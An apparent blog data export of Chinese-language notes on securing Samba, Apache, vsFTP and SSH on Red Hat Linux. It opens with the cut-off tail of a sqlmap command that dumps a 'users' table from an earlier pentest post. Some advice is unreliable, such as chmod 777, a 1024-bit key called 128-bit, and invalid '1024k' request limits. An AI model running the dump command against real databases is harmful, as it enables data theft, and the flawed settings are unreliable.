&#39;users&#39; -C &#39;user_id&#39; --dump]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（五）：SAMBA 服务安全配置]]></title>
    <url>%2Farchives%2F9044a7d9.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的服务配置笔记系列第五篇,这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享,使 Windows 能够访问 Liunx 下共享出来的文件配置文件的位置主配置文件：/etc/samba/smb.conf服务的启动与停止SAMBA 的服务名并不叫做 samba,而是 smb。修改配置文件过后一定要重启 smb 服务。service smb status # 状态 service smb start # 启动 service smb stop # 暂停 service smb restart # 重启 服务的安装创建挂载目录For Example:mkdir -p /mnt/cdrom 挂在光盘For Example:mount /dev/cdrom /mnt/cdrom 安装For Example:cd /mnt/cdrom/Server rpm -ivh perl-Convert-ASN1-0.20-1.1.noarch.rpm rpm -ivh samba-3.0.33-3.28.el5.i386.rpm 安全配置配置工作组和 NetBIOS 名字Default Configuration:workgroup = MYGROUP ;netbios name = MYSERVER 该文件默认配置的工作组是 MYGROUP,而 Windows 下的工作组默认为 WORKGROUP,Liunx 和 Windows 的工作组一定要一样,才能访问共享的文件。该文件默认将 NetBIOS 的名字注释掉了,NetBIOS 名字就是会在 Windows 下的网上邻居能够看到的名字,注释掉就是会看不到,建议去掉注释。配置安全级别Default Configuration:security = user 默认的配置是 user 模式,在该模式下,Windows 下访问 SAMBA 需要用户名和密码,还可以设置的选项还有 share/user/server/domain/ads。可以根据需求修改此选项。share: 访问 Samba 服务器共享资源时不需要输入用户名和密码,属于匿名访问。user: 访问 Samba 服务器共享资源时需要输入用户名和密码,认证用户来源为 Samba 服务器本机。server: 访问 Samba 服务器共享资源时需要输入用户名和密码,认证用户来源为另一台 Samba 服务器或 Windows 服务器。domain: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中,访问共享资源需要输入用户名和密码,认证用户来源为 Windows 域。ads: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中,访问共享资源需要输入用户名和密码,认证用户来源为 Windows 活动目录。配置认证密码在传输过程中加密在默认的配置文件中没有此选项,可以手动添加,正常情况下是需要开启的。For Example:encrypt passwords = yes 配置用户密码的存储方式Default Configuration:passdb backend = tdbsam 默认的配置为 tdbsam,配置这个选项就是需要 smbpasswd -a [userName] 来建立 Samba 用户。还可以配置项为 tdbsam/smbpasswd/ldapsam/mysql。可以根据需求进行修改。tdbsam: 该方式使用一个数据库文件来建立用户数据库,数据库文件名为 passdb.tdb 。可以使用 smbpasswd -a [用户名] 来建立 Samba 用户。也可以使用 pdbedit 命令来建立用户。smbpasswd: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码,客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 smb passwd file = /usr/local/samba/etc/smbpasswd（或 /etc/samba/smbpasswd） 参数来指定保存用户名和密码的文件,该文件需要手动建立。不推荐使用此方法。ldapsam: 该方式基于 LADP 的账户管理方式来验证用户,先要建立 LDAP 服务。mysql: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。设置白名单Default Configuration:;hosts allow = 127\. 192.168.12\. 192.168.13. 默认的配置是将白名单进行注释掉的,这里需要注意的是,可以配置一个具体的 IP 地址,也可以配置一个 IP 地址段,在配置 IP 地址段的时候要注意最后一个 . 不要忘了写。如默认配置中的 127. 就是规定 127.0.0.1 ～ 127.255.255.254 这个 IP 地址段可以进行访问,具体的 IP 地址不需要最后的 ..For Example:单目录限定用户访问,禁止写入文件For Example:[test] # 共享目录的名字 comment = test # 描述信息 path = /home/test # 共享目录路径 browseable = yes # 是否允许浏览 writable = no # 是否允许用户写入或者创建文件 guest ok = no # 是否允许 guest 用户访问 valid users = sx # 白名单,指定能够进入此资源目录的特定用户,使用逗号隔开,如果是组的话,使用 @ 指明 另外还可以配置以下参数read only =&gt; 设置是否只读,yes/nopublic =&gt; 设置是否让所有可以登录的用户看到这个项目create mode =&gt; 指明新建立的文件的属性,一般是 0755。directory mode =&gt; 指明新建立的目录的属性,一般是 0755。创建共享目录,设置权限For Example:mkdir /hoem/test chmod 777 /home/test 注意共享目录一定要有执行权限,一般 755 就够了,这里设置 777 就是权限大一点就是了。添加 SAMBA 用户For Example:useradd zc useradd sx smbpasswd -a zc smbpasswd -a sx 这里需要注意的是,要使用 smbpasswd -a 创建用户,因为之前设置了用户密码的存储方式为 tdbsam。使用 windows 访问For Example:输入用户名和密码,就可以愉快的进行测试了,这里就不多说了。使用 smbclient 访问列出共享文件夹列出某个 IP 地址所提供的共享文件夹Connect Format:smbclient -L [ip] -U [userName]%[password] 像 FTP 客户端一样使用 smbclient执行 smbclient 命令成功后,进入 smbclient 环境,出现提示符： smb:\&gt; 这里有许多命令和 ftp 命令相似,如 cd、lcd、get、megt、put、mput 等。通过这些命令,我们可以访问远程主机的共享资源。Connect Format:smbclient http://[ip]/[shareFolder] -U [username]%[password]]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（四）：APACHE 服务安全配置]]></title>
    <url>%2Farchives%2Fe21a12c7.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的服务配置笔记系列第四篇,这一篇将具体介绍 Red Hat Liunx 下 APACHE 服务的安全配置。所谓 APACHE 就是一个 WEB 服务器,为 WEB 网页提供服务配置文件的位置主配置文件：/etc/httpd/conf/httpd.conf服务的启动与停止APACHE 的服务名并不叫做 http,而是 httpd。修改配置文件过后一定要重启 httpd 服务。service httpd status # 状态 service httpd start # 启动 service httpd stop # 暂停 service httpd restart # 重启 安全配置修改网站的根目录Default Configuration:DocumentRoot &quot;/var/www/html&quot; &lt;Directory &quot;/var/www/html&quot;&gt; APACHE 默认配置的网站根目录是在 /var/www/html 下,我们可以根据需求修改它。修改这个配置项的时候,还需同时修改 &lt;Directory &quot;/var/www/html&quot;&gt; 这个配置项。修改主配置文件DocumentRoot &quot;/mnt/www&quot; &lt;Directory &quot;/mnt/www/&quot;&gt; 使用客户端进行验证验证之前,请重启服务。使用浏览器打开即可。验证之前,还需创建网站存放的目录,然后在创建一个测试的网页进行测试。For Example:mkdir /mnt/www/ echo &quot;this is test.&quot; &gt;&gt; /mnt/www/index.html 接下来,在浏览器里输入你的服务器的 IP 地址就可以访问了。配置目录的别名修改主配置文件目录别名设置,就是浏览器访问 http://[host]/test 时,实际上访问的是 /var/www/html/test 目录。Alias /test &quot;/var/www/html/test&quot; &lt;Directory&gt; Options Indexes Order allow,deny allow from all &lt;/Directory&gt; 使用客户端进行验证验证之前,请重启服务。使用浏览器打开即可。这时候就需要跟上目录名了。验证之前,还需要创建测试目录和测试网站文件。For Example:mkdir /var/www/html/test echo &quot;dir dir dir dir.&quot; &gt;&gt; /var/www/html/index.html 接下来,在浏览器里输入 IP/test 就可以访问了。注意大小写敏感。关闭版本信息的显示Default Configuration:ServerSignature On 如果你访问一个不存在的目录,默认是会显示 APACHE 的版本信息,这是很不安全的,建议关掉,注意大小写敏感。还可以设置为 Off 和 EMail。其中 Off 是隐藏信息,EMail 是会显示管理员的 email 信息的。修改主配置文件ServerSignature Off 使用客户端进行验证先看一下,没有进行修改之前会显示什么吧！随便写一个目录,访问它吧！修改好配置之后,重新访问,再次看一下有没有吧！禁用目录浏览、符号连接追踪Default Configuration:&lt;Directory &quot;/var/www/html&quot;&gt; Options Index FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; Index 是定义是否开启目录浏览,默认开启,要关闭只需添加 -；FollowSymLinks 是定义是否符号连接追踪,默认开启,要关闭只需添加 -。修改主配置文件由于之前修改过网站根目录,所以在这里直接使用。&lt;Directory &quot;/mnt/html&quot;&gt; Options -Index -FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; 使用客户端进行验证配置禁用目录浏览,说白了就是当一个目录下没有类似于 index.php 、 index.html、default.php、defaule.html 等这样子的主页,APACHE 默认会把该目录下的目录结构给列出来,禁用就是阻止其列出。配置禁用符号连接追踪,说白了就是防止某个用户偶然创建的一个符号连接指向文件爱呢系统的某一部分。配置白名单,其实就是限制一些 IP 地址,让其不能访问 APACHE。这些配置,在实际使用的过程中才会有体会,这里就不再进行测试了。开启白名单Default Configuration:&lt;Directory &quot;/var/www/html&quot;&gt; Options Index FollowSymLinks AllowOverride None Order allow,deny Allow from all &lt;/Directory&gt; 直接修改 Allow from 这一项,Allow from 是定义白名单,默认是允许所有 IP 地址访问,要限制只需把 all 替换成允许访问的 IP 地址就好。修改主配置文件&lt;Directory &quot;/mnt/html&quot;&gt; Options -Index -FollowSymLinks AllowOverride None Order allow,deny Allow from 192.168.1.0/24 &lt;/Directory&gt; 限制 http 请求包上限HTTP 协议包包含请求包和应答包。HTTP 请求包(GET、POST 等请求方法)由三个部分构成,分别是：方法-URI-协议/版本,请求头即请求正文；HTTP 应答包和 HTTP 请求包相似,由三个部分构成,分别是：协议-状态代码-描述,应答头即应答正文。LimitRequestLine 指令设置 HTTP 请求行的字节数限制。LimitRequestLine 指令允许服务器管理员增加或减少客户端 HTTP 请求行允许大小的限制。因为请求行包括 HTTP 方法、URI、协议版本,所以 LimitRequestLine 指令会限制请求 URI 的长度。服务器会需要这个值足够大以装载它所有的资源名,包括可能在 GET 请求中所传递的查询部分的所有信息。这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。LimitRequestFieldSize 指令指定 HTTP 请求头允许的字节大小。LimitRequestFieldSize 指令允许服务器管理员增加或减少 HTTP 请求头域大小的限制。一般来说,服务器需要此值足够大,以适应普通客户端的任何请求的头域大小。一个普通头域的大小对于不同的客户端来说是有很大差别的,一般与用户配置他们的浏览器以支持更多的内容协议密切相关。SPNEGO 的认证头最大可能达到 12392 字节。这个指令给了服务器管理员更大的可控性以控制客户端不正常的请求行为。这有助于避免某些形式的拒绝服务攻击。示例配置默认配置中是没有 LimitRequestLine 指令和 LimitRequestFieldSize 指令,需要手动添加LimitRequestLine 1024k LimitRequestFieldSize 1024k 配置 httpsHTTPS 协议是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议要比 http 协议安全。生成证书和密钥生成密钥openssl genrsa 1024 &gt; server.key 这是用 128 位 rsa 算法生成密钥,得到 server.key 文件生成证书请求文件openssl req -new -key server.key &gt; server.csr 这是用上面的密钥生成证书请求文件 server.csr生成证书openssl req -x509 -days 365 -key server.key -in server.csr &gt; server.crt 这是用前面生成的密钥和证书请求生成证书 server.crt,-days 参数指明证书有效期,单位为天生成证书和密钥的例子注意路径,记住它。确认是否安装 ssl 模块只要确定系统中有 mod_ssl.so 文件,就可以确定已经安装好 ssl 模块。记住路径吧！find / -iname &quot;*mod_ssl.so*&quot; # 使用 find 命令进行搜索 配置 APACHE配置 httpd-ssl.conf 文件注意在此文件中配置证书和密钥,注意路径,这里就使用上面的路径。系统中可能没有此文件,可以先创建它,For Example:vim /etc/httpd/conf/httpd-ssl.conf 修改主配置文件,添加如下内容,For Example:SSLCertificateFile /home/server.crt SSLCertificateKeyFile /home/server.key 配置 httpd.conf 文件虚拟机设置修改主配置文件,For Example:NameVirtualHost *:443 &lt;VirtualHost *:443&gt; ... &lt;/VirtualHost&gt; 修改主配置文件打开 ssl 模块,并引入配置文件修改主配置文件,For Example:LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so Include &quot;/etc/httpd/conf/httpd-ssl.conf&quot; 这里提供简洁方法,在 vi 下使用 :r !find / -iname &quot;*mod_ssl.so*&quot;,在配置文件中也可以很任性的将 httpd-ssl.conf 里的内容填入主配置文件。修改主配置文件,For Example:LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so SSLCertificateFile /home/server.crt SSLCertificateKeyFile /home/server.key 以上的配置写在任何地方均生效,但要注意的是配置中可能没有以下选项,需要手动添加,For Example:SSLEngine on 但是最好还是写在 &lt;VirtualHost *:443&gt;&lt;/VirtualHost&gt; 这个地方,For Example:&lt;VirtualHost *:443&gt; LoadModule ssl_module /usr/lib/httpd/modules/mod_ssl.so SSLEngine on SSLCertificateFile /home/server.crt SSLCertificateKeyFile /home/server.key &lt;/VirtualHost&gt; 将监听 80 端口注释如果不注释的话,依然还可以通过 http 方式访问,注释掉,只能使用 https 方式访问。For Example:访问配置好了,重启服务,接下来就可以愉快的使用 https 来访问了。For Example:]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（三）：FTP 服务安全配置]]></title>
    <url>%2Farchives%2F48020709.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的服务配置笔记系列第三篇,这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说,应该叫它 vsFTP,就是文件的上传和下载服务,主要的功能是在服务器与客户端之间进行文件的传输配置文件的位置主配置文件：/etc/vsftpd/vsftpd.conf服务的启动与停止FTP 的服务名并不叫做 vsftp,而是 vsftpd。修改配置文件过后一定要重启 vsftpd 服务。service vsftpd status # 状态 service vsftpd start # 启动 service vsftpd stop # 暂停 service vsftpd restart # 重启 服务的安装创建挂载目录For Example:mkdir -p /mnt/cdrom 挂载光盘For Example:mount /dev/cdrom /mnt/cdrom 安装For Example:cd /mnt/cdrom/Server rpm -ivh vsftpd-2.0.5-16.e15i386.rpm 安全配置禁止匿名用户登录Default Configuration:anonymous_enable=YES 默认的值是允许的,这样匿名用户就可以不需要密码就可以登录 FTP 了,这样很不安全,把它修改成 NO 吧。使用客户端进行验证验证之前,请重启服务。我们就直接使用 FTP 用户登录吧。Connection Format:ftp [host] 若没有成功登录,则会显示530 Login incorrect. 使用 bye,可以退出 FTP,成功则会显示221 Googbye 使用户不能登录系统,但可以登录 FTP首先要创建一个普通的用户,使他不能登录系统,只需设置登录的 shell 就好了。创建一个新用户,别忘了设置密码,For Example:useradd -s /sbin/nologin test passwd test For Example:使用客户端进行验证验证之前,请重启服务。这时候,我们就要使用之前创建的用户进行验证了。若登录成功,则会显示230 Login successful 禁止用户写入或者上传文件Default Configuration:write_enable=YES 默认是允许用户进行上传或者写入文件,我们可以根据需求进行修改。使用客户端进行验证验证之前,请重启服务。这时候,我们仍然使用之前创建的用户进行验证。无法创建目录,则会显示550 Permission denied 尝试切换目录,成功则会显示250 Directory successfully changed. 配置空闲会话中断时间Default Configuration:#idle_session_timeout=600 默认的配置时间是十分钟,（默认的单位为秒）,我们可以根据需求进行修改。使用客户端进行验证验证之前,请重启服务。成功登录之后,我们等待一段时间,在进行操作。若超时,则会显示421 Timeout 配置数据连接超时时间Default Configuration:#data_connection_timeout=120 默认的配置是两分钟,（默认的单位为秒）,我们可以根据需求进行修改。使用客户端进行验证此选项需要在传输数据的时候可用,这里不再进行演示。限制普通用户只能在家目录中Default Configuration:#chroot_list_enable=YES #chroot_list_file=/etc/vsftpd/chroot_list 默认是允许用户跳出自己的家目录的,我们可以限制他只能在自己的家目录里。注意,要将用户限制在家目录中,还需要设置 ‘chroot_local_user=YES’。别忘了将禁止的用户添加至 /etc/vsftpd/chroot_list使用客户端进行验证验证之前,请重启服务。这时候,我们仍然使用之前创建的用户进行验证。不能切换目录,则会显示550 Failed to changed directory. 设置黑名单Default Configuration:userlist_enable=YES 默认情况下就是开启的,若无开启,我们可以根据需求进行修改。别忘了,将禁止的用户填入 /etc/vsftpd/ftpusers使用客户端进行验证验证之前,请重启服务。这时候,我们新建一个用户,然后将其加入黑名单,再进行验证。新建用户,For Example:添加至黑名单,For Example:配置虚拟用户登录先安装 db4For Example:rpm -ivh db4-utils-4.3.29-10.el5.i386.rpm 生成虚拟用户口令库文件For Example:vim /etc/vsftpd/login.txt 需要注意的是,该文件的格式如下,单数行为用户名,偶数行为口令。生成口令库文件,并修改其权限For Example:db_load -T -t hash -f /etc/vsftpd/login.txt /etc/vsftpd/login.db chmod 600 /etc/vsftpd/login.db 注意要设置权限,只有 root 用户拥有读写权限。修改虚拟用户的 PAM 文件For Example:vim /etc/pam.d/vsftpd 加入如下内容,其他的全部注释掉auth required pam_userdb.so db=/etc/vsftpd/login account required pam_userdb.so db=/etc/vsftpd/login 数据文件的地址,记得要写对哦。建立虚拟用户,并设置权限For Example:useradd -d /home/ftp -s /sbin/nologin virtual chmod 777 /home/ftp passwd virtual 修改主配置文件添加如下内容,For Example:guest_enable=YES guest_username=virtual user_config_dir=/etc/vsftpd_user_conf 创建配置文件存放目录此目录一定要与配置文件中的一致,For Example:mkdir -p /etc/vsftpd_user_conf 为虚拟用户创建配置文件为虚拟口令库中的每个用户分别创建一个配置文件,配置文件中的配置于匿名用户的配置相差无几。先创建配置文件,For Example:vim /etc/vsftpd_user_conf/ftp_test 在配置文件中配置如下内容,anon_world_readable_only=NO # 是否允许浏览 FTP 目录和下载 anon_upload_enable=YES # 是否允许上传 write_enable=YES # 是否有写权限 download_enable=YES # 是否允许下载文件 anon_mkdir_write_enable=YES # 是否允许建立和删除目录 anon_other_write_enable=YES # 是否允许改名和删除文件 local_root=/var/ftp/share/123 # 指定虚拟用户在系统用户下面的路径,限制虚拟用户的家目录,虚拟用户登录后的主目录。 最后只需创建一下虚拟用户登录后的主目录,For Example:mkdir -p /var/ftp/share/123 登录测试这时候就要使用虚拟用户口令库文件里的用户名和密码来登录 FTP 服务器]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（二）：SSH 服务安全配置]]></title>
    <url>%2Farchives%2Ff22e3ca2.html</url>
    <content type="text"><![CDATA[本篇是 Liunx 的服务配置笔记系列第二篇,这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输,但是使用其的默认配置并不是安全的,所以还需要对其进行详细的配置配置文件的位置主配置文件：/etc/ssh/sshd_config服务的启动与停止SSH 的服务名并不叫做 ssh,而是 sshd。修改配置文件过后一定要重启 sshd 服务。service sshd status # 状态 service sshd start # 启动 service sshd stop # 暂停 service sshd restart # 重启 安全配置修改端口号Default Configuration:# Port 22 配置文件中将其注释掉,则采用默认的端口 22,我们可以修改它。去掉 # ,修改成我们想要的端口号。Example Configuration:使用客户端进行验证验证之前,请重启服务。默认是允许 root 用户登录的,以下测试例子是使用 root 用户登录的。使用默认端口连接,Connection Format:ssh [userName]@[host | ip] 若端口不对则会显示ssh: connect to host [host | ip] [port] 22: Connection refused Example Connection:使用配置端口连接,Connection Format:ssh [userName]@[host | ip] -p [port] 连接成功则会显示Last login: [date] from [host | ip] Example Connection:禁止 root 用户登录Default Configuration:# PermitRootLogin yes 默认情况下是允许 root 用户登录的,是十分不安全,毕竟 root 用户权限太大了。我们可以去除 #,将 yes 修改成 no,这就禁止了 root 用户登录。Example Configuration:PermitRootLogin no 使用客户端进行验证验证之前,请重启服务。我们已经禁止 root 用户登录了,以下测试例子仍然使用 root 用户进行验证。由于之前配置过端口号,这时候就要使用配置的端口号了,Connection Format:ssh root@[host | ip] -p [port] 使用 exit 可以退出当前的连接,退出成功将会显示Connection to [host | ip] closed Example Connection:禁止空密码登录Default Configuration:# PermitEmptyPasswords no 默认情况下,SSH 已经禁止了使用空密码登录系统,即使配置文件中将其注释掉。如果被设置成 yes,则就是不安全的,我们可以修改成 no。Example Configuration:PermitEmptyPasswords no 使用客户端进行验证验证之前,请重启服务。我们已经禁止 root 用户登录了,以下测试我们将使用普通用户。注意：使用普通用户之前,先确保服务端是有该用户的。由于之前配置过端口号,这时候就要使用配置的端口号了,Connection Format:ssh [userName]@[host | ip] -p [port] 如果是第一次连接的话,会提示是否保存密钥信息,输入 yes 就好。Example Connection:断开连接,我们尝试使用空密码连接,只需回车就好Example Connection:设置必需使用密码登录Default Configuration:# PasswordAuthentication yes 默认的配置就是需要使用密码登录的,即使它是注释的。若遇到配置值为 no 的,一定要修改成 yes。Example Configuration:PasswordAuthentication yes 使用客户端进行验证前面已经验证过了,这里不再重复设置仅允许密钥登录注意密钥登录是与密码登录是不一样的。只允许密钥登录的时候必须要把允许密码登录的选项禁用。For Example:PasswordAuthentication no 接下来就是将下图所示的注释去掉,就好了免密码登录主机生成密钥对（包含公钥和私钥）ssh-keygen -t rsa -P &quot;&quot; 把本地主机的公钥复制到远程主机的 authorized_keys 文件上ssh-copy-id [user]@[server] 限制登录失败之后重试次数Default Configuration:# MaxAuthTries 6 默认情况下可以重试 6 次,如果你觉得这个不合理,当然可以修改它。同理将 # 去除,将 6 修改成我们想要的次数。Example Configuration:MaxAuthTries 3 使用客户端进行验证验证之前,请重启服务。之前我们在服务器上新建了一个用户,那么我们将用这个用户进行连接。当我们输入错误的密码时,则会显示Permission denied, please try again. 当我们最后一次输入错误的密码时,则会显示Permission denied (publickey,gssapi-with-mic,password). Example Connection:设置多长时间没有成功连接上,就断线Default Configuration:# LoginGraceTime 2m 默认的等待时间为 2 分钟,如果没有单位将以秒作为单位,可用的单位分别为 h,m、s。我们可以根据需求修改,当然是越短越安全。Example Configuration:LoginGraceTime 10s 使用客户端进行验证验证之前,请重启服务。之前我们在服务器上新建了一个用户,那么我们仍然使用用这个用户进行连接。我们可以输入一个错误的密码,在等待一段时间,按下回车,则会显示Connection closed by [host | ip] Example Connection:设置白名单和黑名单默认配置中是没有白名单和黑名单这个选项的,我们可以自己添加上去。多个用户之间必须使用空格分割。同理,用户组也一样。白名单AllowUsers [userName]1 [userName]2 ... AllowGroups groupName1 groupName2 ... 黑名单DenyUsers [userName]1 [userName]2 ... DenyGroups groupName1 groupName2 ... Example Configuration:使用客户端进行验证验证之前,请重启服务。由于白名单与黑名单效果是一致的,这里只提供白名单的验证测试。注意：服务器上依然需要新建测试用户（包含设置密码,否则,不能登录）。这时候,我们就需要输入正确的密码。Example Connection:限制 IP 登录方法一在 /etc/hosts.allow 中添加 SSH 登录的 ip 或者网段, For Example:sshd:192.168.1.2:allow # ip 地址 sshd:192.168.1.0/24:allow # 网段 在 /etc/hosts.deny 中添加不允许 SSH 登录的 IP, For Example:sshd:ALL # ALL 表示除了上面允许的,其他的 ip 都拒绝登录 方法二使用 iptables, For Example:iptables -A INPUT -p tcp -s 192.168.1.2 --destination-port 22 -j ACCEPT iptables -A INPUT -p tcp --destination-port 22 -j DROP 方法三修改 sshd 主配置文件 /etc/ssh/sshd_config, For Example:AllowUsers test@192.168.1.2]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（一）：概述]]></title>
    <url>%2Farchives%2F6b4c6369.html</url>
    <content type="text"><![CDATA[Liunx 的学习笔记已经推出有一段时间了,现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容SAMBA 服务即 Windows 下的共享,SAMBA 服务只不过是将 Liunx 下的文件共享给 Windows。使用到的端口号NetBIOS 名字服务（默认为 137 端口(UDP)）NetBIOS 数据报服务（默认为 138 端口(UDP)）文件和打印共享（默认为 139 端口(TCP)）NetBIOS 服务在 windos 2000 及以后版本使用此端口（默认为 445 端口(TCP)）所需软件samba这个软件主要包含了 SAMBA 的主要 daemon 文件（smbd 及 nmbd）、SAMBA 的文件（document）与 SAMBA 相关的 logrotate 设置文件及开机默认选项文件等。samba-common这个软件主要提供了 SAMBA 的主要配置文件（smb.conf）、smb.conf 语法检验的测试程序（testparm）等samba-client这个软件提供了当 Liunx 作为 SAMBA 客户端时,所需的工具指令,例如挂载 SAMBA 文件格式的执行文件 smbmount 等主配置文件/etc/samba/smb.conf是 SAMBA 的主要配置文件,基本上,SAMBA 就仅有这个配置文件而已,且这个配置文件本身就是很详细的说明文件,这个文件主要在设置工作组、NetBIOS 名称以及共享目录等。查看主配置文件的帮助man 5 smb.conf 重要选项说明全局选项workgroup = [MYGROUP]定义 samba 服务器所在的工作组或者域（如果设置 security = domain 的话）。server string = [Samba server]设定 samba 服务器的描述,通过网络邻居访问时可在备注中查看到该描述信息。netbios name = [MyServer]主机 NetBIOS 名称,每台机子皆不同security = share/user/server/domain/adsshare: 访问 Samba 服务器共享资源时不需要输入用户名和密码,属于匿名访问。user: 访问 Samba 服务器共享资源时需要输入用户名和密码,认证用户来源为 Samba 服务器本机。server: 访问 Samba 服务器共享资源时需要输入用户名和密码,认证用户来源为另一台 Samba 服务器或 Windows 服务器。domain: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中,访问共享资源需要输入用户名和密码,认证用户来源为 Windows 域。ads: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中,访问共享资源需要输入用户名和密码,认证用户来源为 Windows 活动目录。encrypt passwords = yes | no设定是否对密码进行加密。如果不对密码进行加密的话,在认证会话期间,客户端与服务器传递的是明文密码。passdb backend = tdbsam/smbpasswd/ldapsam/mysqltdbsam: 该方式使用一个数据库文件来建立用户数据库,数据库文件名为 passdb.tdb 。可以使用 smbpasswd -a [userName] 来建立 Samba 用户。也可以使用 pdbedit 命令来建立用户。smbpasswd: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码,客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 smb passwd file = /usr/local/samba/etc/smbpasswd（或 /etc/samba/smbpasswd） 参数来指定保存用户名和密码的文件,该文件需要手动建立。不推荐使用此方法。ldapsam: 该方式基于 LADP 的账户管理方式来验证用户,先要建立 LDAP 服务。mysql: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。局部设置comment = [comment]设定共享服务的描述信息。path = [path]设定共享服务的路径。read only = yes | no设定该共享服务是否为只读,该选项有一个同义选项 writeable。user = userName设定所有可能使用该共享服务的用户,可以使用 @group 来设置群组 group 中的所有用户账号。该选项的值为列表,不同的项目之间使用空格或逗号隔开。在设置 security = share 时,客户端要访问某共享服务时提供的密码会与该选项指定的所有用户进行一一配对认证,若某用户认证通过,则以该用户权限进行共享服务访问,否则拒绝客户端的访问（设置 security = share不是允许游客访问,只有 guest ok = yes 才是允许游客访问,切记！！！）。valid users = userName设定能够使用该共享服务的用户和组,其值的格式与 user 选项一样。invalid users = userName设定不能够使用该共享服务的用户和组,其值的格式与 user 选项一样。invalid users = userName设定不能够使用该共享服务的用户和组,其值的格式与 user 选项一样。read list = userName设定对该共享服务只有读取权限的用户和组,其值的格式与 user 选项一样。write list = userName设定对该共享服务拥有读写权限的用户和组,其值的格式与 user 选项一样。admin list = userName设定对该共享服务拥有管理权限的用户和组,其值的格式与 user 选项一样。public = yes | no设定该共享服务是否能够被游客访问,其同义选项有 guest ok。create mode = modemode 为八进制值,如 0755,其默认值为 0744。该选项指定的值用于过滤新建文件的访问权限,新建文件的默认权限将与 create mode 指定的值进行按位与操作,将结果再与 force create mode 指定的值进行按位或操作,得到的结果即为新建文件的访问权限。服务的启动与停止SAMBA 的服务名并不叫做 samba,而是 smb。service smb status # 状态 service smb start # 启动 service smb stop # 暂停 service smb restart # 重启 设置开机自启chkconfig --list | grep smb # 查看自启状态 chkconfig --level 35 smb on # 设置开机自启 SSH 服务更安全的远程连接,它通过对联机数据包加密的技术来进行数据传输,因此,数据就更安全了。使用到的端口号安全的数据传输（默认为 22 端口）所需软件一般情况下,RedHat 已经预装了 openssh,所以这里不做过多的阐述了主配置文件/etc/ssh/sshd_configsshd_config 是 SSH 的主要配置文件,基本上,SSH 相关的配置都放在这里,这个文件的默认配置项已经很完美了,事实上不需要过多的改动。查看主配置文件的帮助man 5 sshd_config 重要选项说明监听相关配置Port 22设置连接到远程主机的端口,可以进行修改ListenAddress [192.168.1.1]设置 sshd 服务器绑定的 IP 地址密码、登录相关配置MaxAuthTries 3最大密码输入错误次数PermitRootLogin no设置 root 能不能用 ssh 登录。这个选项一定不要设成 “yes”LoginGraceTime 600当用户连接上 SSH 时,在输入密码界面,设置在多长时间内没有成功连接 SSH ,就断线（若无单位默认以秒为单位）PasswordAuthentication yes设置是否允许口令验证PermitEmptyPasswords no设置是否允许用口令为空的帐号登录用户限制配置AllowUsers [userName]设置白名单,可以跟着任意的数量的用户名的匹配串（patterns）或 user@host 这样的匹配串,这些字符串用空格隔开。AllowGroups [groupName]设置白名单,可以跟着任意的数量的组名的匹配串（patterns）或 user@host 这样的匹配串,这些字符串用空格隔开。DenyUsers [userName]设置黑名单,与 AllowUsers 写法一致。DenyGroups [groupName]设置黑名单,与 AllowGroups 写法一致。服务的启动与停止SSh 的服务名并不叫做 ssh,而是 sshd。service sshd status # 状态 service sshd start # 启动 service sshd stop # 暂停 service sshd restart # 重启 设置开机自启chkconfig --list | grep sshd # 查看自启状态 chkconfig --level 35 sshd on # 设置开机自启 FTP 服务确切的说,应该叫它 vsFTP。vsFTP 是一个基于 GPL 发布的类 Unix 系统上使用的 FTP 服务器软件,它的全称是 Very Secure FTP使用到的端口号命令通道的 FTP（默认为 21 端口）数据传输的 FTP-data（默认为 20 端口）所需软件vsftpd这个软件主要包含了 vsFTP 的主要 daemon 文件。主要的配置文件/etc/vsftp/vsftpd.conf严格来说,整个 vsFTP 